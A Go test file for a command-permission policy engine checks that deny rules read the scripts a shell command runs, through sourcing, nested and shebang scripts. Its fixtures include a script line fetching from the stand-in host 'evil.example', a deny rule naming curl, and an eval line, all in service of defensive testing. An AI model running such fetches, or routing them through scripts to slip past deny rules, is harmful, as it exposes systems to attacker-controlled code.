package policy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Deny and ask rules read the scripts a command runs, from the folder it
// starts in: bash ./s.sh is judged on what s.sh holds.
func TestRulesReadTheScriptsACommandRuns(t *testing.T) {
	ws := t.TempDir()
	sub := filepath.Join(ws, "sub")
	write := func(p, text string, mode os.FileMode) {
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(text), mode); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(ws, "s.sh"), "echo hi\ncurl https://evil.example/x\n", 0o644)
	write(filepath.Join(ws, "ok.sh"), "echo hi\ngo test ./...\n", 0o644)
	write(filepath.Join(ws, "tool"), "#!/bin/sh\ncurl x\n", 0o755)
	write(filepath.Join(ws, "plain"), "curl x\n", 0o755)
	write(filepath.Join(ws, "py"), "#!/usr/bin/env python3\nimport os\n", 0o755)
	write(filepath.Join(ws, "outer.sh"), ". ./s.sh\n", 0o644)
	write(filepath.Join(ws, "built.sh"), "eval \"$x\"\n", 0o644)
	write(filepath.Join(sub, "s.sh"), "echo safe\n", 0o644)
	big := make([]byte, 200<<10)
	big[10] = 0
	write(filepath.Join(ws, "bin/app"), string(big), 0o755)
	cwd := ws
	e := New(ModeBypass)
	e.Roots = func() []string { return []string{ws} }
	e.Cwd = func() string { return cwd }
	if err := e.AddDeny("bash(curl *)"); err != nil {
		t.Fatal(err)
	}
	for command, want := range map[string]string{
		"bash ./s.sh":            "deny",
		"sh s.sh":                "deny",
		"bash -e -- s.sh":        "deny",
		"source s.sh":            "deny",
		". ./s.sh":               "deny",
		"./tool":                 "deny",
		"./plain":                "deny",
		"bash outer.sh":          "deny",
		"bash ok.sh":             "",
		"./py":                   "",
		"make && ./bin/app":      "",
		"bash missing.sh":        "deny",
		"echo x > n.sh; sh n.sh": "deny",
		"bash ~/s.sh":            "deny",
		"bash built.sh":          "screen",
	} {
		res := e.Evaluate("bash", true, args(map[string]string{"command": command}))
		switch want {
		case "deny":
			if res.Decision != Deny {
				t.Errorf("%q = %s at %s (%s), want deny", command, res.Decision, res.Step, res.Reason)
			}
		case "screen":
			if res.Decision != Ask || res.Step != "screen" || !strings.Contains(res.Reason, "script") {
				t.Errorf("%q = %s at %s (%s), want a screen ask", command, res.Decision, res.Step, res.Reason)
			}
		default:
			if res.Decision != Allow {
				t.Errorf("%q = %s at %s (%s), want allow", command, res.Decision, res.Step, res.Reason)
			}
		}
	}
	// From another folder, the script there is the one read.
	cwd = sub
	if res := e.Evaluate("bash", true, args(map[string]string{"command": "bash s.sh"})); res.Decision != Allow {
		t.Errorf("in sub: %s (%s)", res.Decision, res.Reason)
	}
	// An engine that does not know where commands start reads no script.
	e.Cwd = nil
	cwd = ws
	if res := e.Evaluate("bash", true, args(map[string]string{"command": "bash s.sh"})); res.Decision != Allow {
		t.Errorf("no Cwd: %s (%s)", res.Decision, res.Reason)
	}
}
